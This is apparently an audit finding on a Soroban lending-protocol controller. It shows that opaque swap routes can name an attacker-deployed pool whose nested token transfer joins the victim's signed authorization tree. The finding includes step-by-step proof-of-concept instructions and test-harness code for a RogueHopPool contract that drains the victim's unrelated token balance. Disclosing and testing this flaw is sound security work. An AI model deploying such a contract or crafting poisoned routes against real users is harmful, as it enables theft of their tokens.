### Title
Opaque swap routes let route-selected code steal unrelated caller tokens through the signed authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary

`swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`, and flash-position swap paths accept `swap` as opaque `Bytes` and forward it to the configured router without validating the contracts the route will invoke. [1](#0-0) [2](#0-1) 

A malicious route can name an attacker-deployed contract as a venue pool. That contract can request an unrelated `token.transfer(victim, attacker, amount)` while still satisfying the router's measured-input and measured-output checks. Simulation records that transfer as a child of the victim's controller authorization; if the victim signs the simulated authorization tree, the transfer succeeds. [3](#0-2) [4](#0-3) [5](#0-4) 

### Finding Description

The collateral-swap entry point requires caller authentication and account ownership or delegation, but treats the supplied `swap` value as opaque router input. [6](#0-5) [7](#0-6) 

`swap_tokens` only rejects an empty route, records input/output balances, authorizes one exact input-token transfer to the router, invokes `execute_strategy`, and checks the controller's resulting token balances. [8](#0-7) [9](#0-8) 

Those checks bound the router's spending of the declared input and require a positive output, but they do not constrain other authorization requests made by route-selected contracts. [10](#0-9) 

The harness demonstrates the resulting authorization confusion: a route-selected contract transfers the victim's entire balance of a token that the lending protocol never listed, while returning enough output for the swap to succeed. [11](#0-10) [12](#0-11) 

### Impact Explanation

An attacker can steal unrelated tokens held by a user who signs a poisoned swap transaction, including assets never deposited into or listed by the lending protocol. [13](#0-12) [14](#0-13) 

The theft is not limited to the swap input or collateral position because the malicious nested call can target any token contract and any recipient the signed authorization tree permits. [15](#0-14) 

### Likelihood Explanation

The attacker needs to convince a victim to submit a crafted route and sign the authorization tree returned by simulation, so the attack requires victim interaction but no privileged protocol role or leaked key. [16](#0-15) [17](#0-16) 

The malicious venue must preserve the swap's measured accounting by spending exactly the declared input and returning a positive output; otherwise the router or controller reverts. [9](#0-8) [10](#0-9) 

A user who signs only the honest root invocation is protected because the host rejects the nested transfer; the vulnerability materializes when the user signs the complete poisoned tree produced for the malicious route. [18](#0-17) [15](#0-14) 

### Recommendation

Do not allow swap payloads to name arbitrary executable pool contracts. Enforce a governance-managed allowlist of venue pool addresses, or replace payload-selected contract addresses with protocol-registered pool identifiers. Wallets and quoting clients should additionally reject any controller authorization tree containing calls other than the expected declared input transfer, but client-side checking alone does not remove the contract-level trust-boundary weakness.

### Proof of Concept

1. Deploy `RogueHopPool`; its venue method calls `token.transfer(victim, attacker, wallet_balance)` on an unrelated token held by the victim. [19](#0-18) 
2. Fund the venue or its route with enough `new.asset` to return the expected positive output.
3. Craft `swap` so a route hop resolves the attacker's contract as the pool while keeping the declared input and output assets valid. [20](#0-19) 
4. Have the victim invoke `Controller::swap_collateral(caller=victim, account_id, current=USDC, amount=5000_USDC, new=ETH, swap=crafted_route)`. [21](#0-20) 
5. During simulation, the rogue contract's unrelated `token.transfer` is recorded as a child of the victim's `swap_collateral` authorization. [22](#0-21) 
6. Submit the transaction with that signed tree; the victim's unrelated token balance moves to the attacker while the controller still observes positive output and completes the collateral swap. [15](#0-14)

### Citations

**File:** common/src/types/shared.rs (L9-10)
```rust
/// Encoded swap route passed to the aggregator router's `execute_strategy` entry point.
pub type StrategySwap = Bytes;
```

**File:** contracts/controller/src/strategies/swap.rs (L21-38)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-55)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** contracts/controller/src/strategies/swap.rs (L74-83)
```rust
/// Returns the output balance increase; rejects zero or negative receipts.
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L82-100)
```rust
impl Scene {
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-183)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-257)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-47)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/lib.rs (L280-303)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
    }
```
